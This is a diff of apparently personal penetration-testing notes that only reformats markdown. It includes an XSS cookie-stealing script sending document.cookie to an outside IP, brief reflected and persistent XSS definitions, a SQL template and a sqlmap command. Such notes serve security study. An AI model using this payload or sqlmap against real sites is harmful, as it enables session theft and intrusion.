@@ -157,16 +157,16 @@ The general steps I use to find and test XSS are as follows:
 2. Test with <i> tag
 3. Test with HTML/JavaScript code (alert('XSS'))
 
-<script>
+`<script>
 var i = new Image();
 i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
-</script>
+</script>`
 
 - Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
 - Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post
 
 ### SQLI
-Select <column> from <table> where <condition>
+`SELECT <column> from <table> where <condition>`
     
 #### SQLMap
     sqlmap -u http://10.10.10.10 -p parameter
